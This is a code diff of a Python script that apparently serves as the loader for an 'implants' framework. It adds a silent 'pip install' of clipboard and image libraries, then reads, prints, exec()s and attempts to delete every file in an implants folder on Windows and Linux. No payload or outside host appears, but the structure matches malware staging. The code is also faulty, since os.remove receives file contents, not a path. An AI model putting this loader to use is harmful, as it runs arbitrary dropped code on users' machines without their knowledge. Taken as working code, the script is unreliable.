@@ -1,4 +1,8 @@
 import os
+import socket
+
+def import_modules():
+    os.system("pip install pyperclip Pillow")
 
 def read_and_print_all_files(directory_path):
     files = []
@@ -11,20 +15,28 @@ def read_and_print_all_files(directory_path):
 def setup():
     # If windows
     if os.name == "nt":
-        pass
+        for file in read_and_print_all_files("implants"):
+            try:
+                file = open("implants\\" + file, encoding="utf-8").read()
+                print(file)
+                exec(file)
+                print("Running " + file)
+                os.remove(file)
+            except Exception as e:
+                print(e)
     # If Linux
     else:
-        pass
+        for file in read_and_print_all_files("implants"):
+            try:
+                file = open("implants/" + file, encoding="utf-8").read()
+                exec(file)
+                print("Running " + file)
+                os.remove(file)
+            except Exception as e:
+                print(e)
 
-    for file in read_and_print_all_files("implants"):
-        try:
-            file = open("implants\\" + file, encoding="utf-8").read()
-            exec(file)
-            print("Running " + file)
-            os.remove(file)
-        except Exception as e:
-            print(e)
 
 if __name__ == "__main__":
+    import_modules()
     setup()
     print("All done")
